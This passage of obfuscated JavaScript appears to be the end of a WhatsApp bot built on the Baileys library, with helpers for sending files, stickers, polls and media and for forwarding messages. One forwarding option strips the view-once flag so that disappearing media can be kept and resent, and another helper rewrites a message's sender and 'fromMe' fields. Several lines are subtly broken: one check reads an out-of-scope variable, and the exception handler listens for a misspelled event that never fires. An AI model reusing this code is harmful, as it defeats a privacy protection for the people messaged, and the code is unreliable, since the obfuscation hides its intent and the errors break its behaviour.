    let _0x964a5a = (await FileType.fromBuffer(_0x1b5173)) || {
      mime: "application/octet-stream",
      ext: ".bin"
    };
    filename = path.join(__filename, "../src/" + new Date() * 1 + "." + _0x964a5a.ext);
    if (_0x1b5173 && _0x3dcaef) {
      fs.promises.writeFile(filename, _0x1b5173);
    }
    return {
      res: _0x708d2e,
      filename: filename,
      size: await getSizeMedia(_0x1b5173),
      ..._0x964a5a,
      data: _0x1b5173
    };
  };
  _0x582124.sendFile = async (_0x171402, _0x16549c, _0x317e6c = "", _0x5ec846 = "", _0x52bb9a, _0x115f42 = false, _0x4cfbce = {}) => {
    let _0x49390b = await _0x582124.getFile(_0x16549c, true);
    let {
      res: _0xeea716,
      data: _0x4dddbb,
      filename: _0x5af8d8
    } = _0x49390b;
    if (_0xeea716 && _0xeea716.status !== 200 || _0x4dddbb.length <= 65536) {
      try {
        throw {
          json: JSON.parse(_0x4dddbb.toString())
        };
      } catch (_0x5ab5a1) {
        if (_0x5ab5a1.json) {
          throw _0x5ab5a1.json;
        }
      }
    }
    let _0x41ad68 = {
      filename: _0x317e6c
    };
    if (_0x52bb9a) {
      _0x41ad68.quoted = _0x52bb9a;
    }
    if (!_0x49390b) {
      _0x4cfbce.asDocument = true;
    }
    let _0x3b5a5a = "";
    let _0x1f6d3c = _0x49390b.mime;
    let _0x50c873;
    if (/webp/.test(_0x49390b.mime) || /image/.test(_0x49390b.mime) && _0x4cfbce.asSticker) {
      _0x3b5a5a = "sticker";
    } else if (/image/.test(_0x49390b.mime) || /webp/.test(_0x49390b.mime) && _0x4cfbce.asImage) {
      _0x3b5a5a = "image";
    } else if (/video/.test(_0x49390b.mime)) {
      _0x3b5a5a = "video";
    } else if (/audio/.test(_0x49390b.mime)) {
      _0x50c873 = await (_0x115f42 ? toPTT : toAudio)(_0x4dddbb, _0x49390b.ext);
      _0x4dddbb = _0x50c873.data;
      _0x5af8d8 = _0x50c873.filename;
      _0x3b5a5a = "audio";
      _0x1f6d3c = "audio/ogg; codecs=opus";
    } else {
      _0x3b5a5a = "document";
    }
    if (_0x4cfbce.asDocument) {
      _0x3b5a5a = "document";
    }
    delete _0x4cfbce.asSticker;
    delete _0x4cfbce.asLocation;
    delete _0x4cfbce.asVideo;
    delete _0x4cfbce.asDocument;
    delete _0x4cfbce.asImage;
    let _0xe403a6 = {
      ..._0x4cfbce,
      caption: _0x5ec846,
      ptt: _0x115f42,
      [_0x3b5a5a]: {
        url: _0x5af8d8
      },
      mimetype: _0x1f6d3c
    };
    let _0x4b90df;
    try {
      _0x4b90df = await _0x582124.sendMessage(_0x171402, _0xe403a6, {
        ..._0x41ad68,
        ..._0x4cfbce
      });
    } catch (_0x216597) {
      _0x4b90df = null;
    } finally {
      if (!_0x4b90df) {
        _0x4b90df = await _0x582124.sendMessage(_0x171402, {
          ..._0xe403a6,
          [_0x3b5a5a]: _0x4dddbb
        }, {
          ..._0x41ad68,
          ..._0x4cfbce
        });
      }
      _0x4dddbb = null;
      return _0x4b90df;
    }
  };
  _0x582124.cMod = (_0x5c6d7d, _0x253dfd, _0x49115c = "", _0x2212e8 = _0x582124.user.id, _0x116ffc = {}) => {
    let _0x1bbe50 = Object.keys(_0x253dfd.message)[0];
    let _0x7ff8f5 = _0x1bbe50 === "ephemeralMessage";
    if (_0x7ff8f5) {
      _0x1bbe50 = Object.keys(_0x253dfd.message.ephemeralMessage.message)[0];
    }
    let _0x3b5e01 = _0x7ff8f5 ? _0x253dfd.message.ephemeralMessage.message : _0x253dfd.message;
    let _0x13e1e4 = _0x3b5e01[_0x1bbe50];
    if (typeof _0x13e1e4 === "string") {
      _0x3b5e01[_0x1bbe50] = _0x49115c || _0x13e1e4;
    } else if (_0x13e1e4.caption) {
      _0x13e1e4.caption = _0x49115c || _0x13e1e4.caption;
    } else if (_0x13e1e4.text) {
      _0x13e1e4.text = _0x49115c || _0x13e1e4.text;
    }
    if (typeof _0x13e1e4 !== "string") {
      _0x3b5e01[_0x1bbe50] = {
        ..._0x13e1e4,
        ..._0x116ffc
      };
    }
    if (_0x253dfd.key.participant) {
      _0x2212e8 = _0x253dfd.key.participant = _0x2212e8 || _0x253dfd.key.participant;
    } else if (_0x253dfd.key.participant) {
      _0x2212e8 = _0x253dfd.key.participant = _0x2212e8 || _0x253dfd.key.participant;
    }
    if (_0x253dfd.key.remoteJid.includes("@s.whatsapp.net")) {
      _0x2212e8 = _0x2212e8 || _0x253dfd.key.remoteJid;
    } else if (_0x253dfd.key.remoteJid.includes("@broadcast")) {
      _0x2212e8 = _0x2212e8 || _0x253dfd.key.remoteJid;
    }
    _0x253dfd.key.remoteJid = _0x5c6d7d;
    _0x253dfd.key.fromMe = _0x2212e8 === _0x582124.user.id;
    return proto.WebMessageInfo.fromObject(_0x253dfd);
  };
  _0x582124.sendMedia = async (_0x892e51, _0x15e8b2, _0x37d49b = "", _0x30e318 = "", _0x577db1 = "", _0x37fc37 = {}) => {
    let _0x3c13dc = await _0x582124.getFile(_0x15e8b2, true);
    let {
      mime: _0x305059,
      ext: _0x54d763,
      res: _0x493ff6,
      data: _0x2d7514,
      filename: _0x34bb1a
    } = _0x3c13dc;
    if (_0x493ff6 && _0x493ff6.status !== 200 || file.length <= 65536) {
      try {
        throw {
          json: JSON.parse(file.toString())
        };
      } catch (_0xc1da89) {
        if (_0xc1da89.json) {
          throw _0xc1da89.json;
        }
      }
    }
    let _0x4b7070 = "";
    let _0x5a8bca = _0x305059;
    let _0x4b4037 = _0x34bb1a;
    if (_0x37fc37.asDocument) {
      _0x4b7070 = "document";
    }
    if (_0x37fc37.asSticker || /webp/.test(_0x305059)) {
      let {
        writeExif: _0x1b597e
      } = require("./lib/exif");
      let _0x1404fb = {
        mimetype: _0x305059,
        data: _0x2d7514
      };
      _0x4b4037 = await _0x1b597e(_0x1404fb, {
        packname: _0x37fc37.packname ? _0x37fc37.packname : global.packname,
        author: _0x37fc37.author ? _0x37fc37.author : global.author,
        categories: _0x37fc37.categories ? _0x37fc37.categories : []
      });
      await fs.promises.unlink(_0x34bb1a);
      _0x4b7070 = "sticker";
      _0x5a8bca = "image/webp";
    } else if (/image/.test(_0x305059)) {
      _0x4b7070 = "image";
    } else if (/video/.test(_0x305059)) {
      _0x4b7070 = "video";
    } else if (/audio/.test(_0x305059)) {
      _0x4b7070 = "audio";
    } else {
      _0x4b7070 = "document";
    }
    await _0x582124.sendMessage(_0x892e51, {
      [_0x4b7070]: {
        url: _0x4b4037
      },
      caption: _0x30e318,
      mimetype: _0x5a8bca,
      fileName: _0x37d49b,
      ..._0x37fc37
    }, {
      quoted: _0x577db1,
      ..._0x37fc37
    });
    return fs.promises.unlink(_0x4b4037);
  };
  _0x582124.copyNForward = async (_0x2ac951, _0x5a5c43, _0x1eb830 = false, _0x437c4a = {}) => {
    let _0x4fd83a;
    if (_0x437c4a.readViewOnce) {
      _0x5a5c43.message = _0x5a5c43.message && _0x5a5c43.message.ephemeralMessage && _0x5a5c43.message.ephemeralMessage.message ? _0x5a5c43.message.ephemeralMessage.message : _0x5a5c43.message || undefined;
      _0x4fd83a = Object.keys(_0x5a5c43.message.viewOnceMessage.message)[0];
      delete (_0x5a5c43.message && _0x5a5c43.message.ignore ? _0x5a5c43.message.ignore : _0x5a5c43.message || undefined);
      delete _0x5a5c43.message.viewOnceMessage.message[_0x4fd83a].viewOnce;
      _0x5a5c43.message = {
        ..._0x5a5c43.message.viewOnceMessage.message
      };
    }
    let _0x40b3a5 = Object.keys(_0x5a5c43.message)[0];
    let _0x5c0f73 = await generateForwardMessageContent(_0x5a5c43, _0x1eb830);
    let _0x2f89ea = Object.keys(_0x5c0f73)[0];
    let _0x3913bc = {};
    if (_0x40b3a5 != "conversation") {
      _0x3913bc = _0x5a5c43.message[_0x40b3a5].contextInfo;
    }
    _0x5c0f73[_0x2f89ea].contextInfo = {
      ..._0x3913bc,
      ..._0x5c0f73[_0x2f89ea].contextInfo
    };
    const _0x1a1345 = await generateWAMessageFromContent(_0x2ac951, _0x5c0f73, _0x437c4a ? {
      ..._0x5c0f73[_0x2f89ea],
      ..._0x437c4a,
      ...(_0x437c4a.contextInfo ? {
        contextInfo: {
          ..._0x5c0f73[_0x2f89ea].contextInfo,
          ..._0x437c4a.contextInfo
        }
      } : {})
    } : {});
    await _0x582124.relayMessage(_0x2ac951, _0x1a1345.message, {
      messageId: _0x1a1345.key.id
    });
    return _0x1a1345;
  };
  _0x582124.sendPoll = (_0xfc55d6, _0x4b1432 = "", _0x37ef2b = [], _0x4c2558 = 1) => {
    return _0x582124.sendMessage(_0xfc55d6, {
      poll: {
        name: _0x4b1432,
        values: _0x37ef2b,
        selectableCount: _0x4c2558
      }
    });
  };
  _0x582124.parseMention = (_0xa322bd = "") => {
    return [..._0xa322bd.matchAll(/@([0-9]{5,16}|0)/g)].map(_0x157435 => _0x157435[1] + "@s.whatsapp.net");
  };
  _0x582124.downloadMediaMessage = async _0x219114 => {
    let _0x266275 = (_0x219114.msg || _0x219114).mimetype || "";
    let _0x2122cc = _0x219114.mtype ? _0x219114.mtype.replace(/Message/gi, "") : _0x266275.split("/")[0];
    const _0x2653dc = await downloadContentFromMessage(_0x219114, _0x2122cc);
    let _0x24f5ac = Buffer.from([]);
    for await (const _0xede453 of _0x2653dc) {
      _0x24f5ac = Buffer.concat([_0x24f5ac, _0xede453]);
    }
    return _0x24f5ac;
  };
  return _0x582124;
}
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});
startXeonBotInc();
process.on("uncaughtexception", function (_0x18996e) {
  let _0x1ad47b = String(_0x18996e);
  if (_0x1ad47b.includes("conflict")) {
    return;
  }
  if (_0x1ad47b.includes("Socket connection timeout")) {
    return;
  }
  if (_0x1ad47b.includes("not-authorized")) {
    return;
  }
  if (_0x1ad47b.includes("already-exists")) {
    return;
  }
  if (_0x1ad47b.includes("rate-overlimit")) {
    return;
  }
  if (_0x1ad47b.includes("Connection Closed")) {
    return;
  }
  if (_0x1ad47b.includes("Timed Out")) {
    return;
  }
  if (_0x1ad47b.includes("Value not found")) {
    return;
  }
  console.log("Caught exception: ", _0x18996e);
});
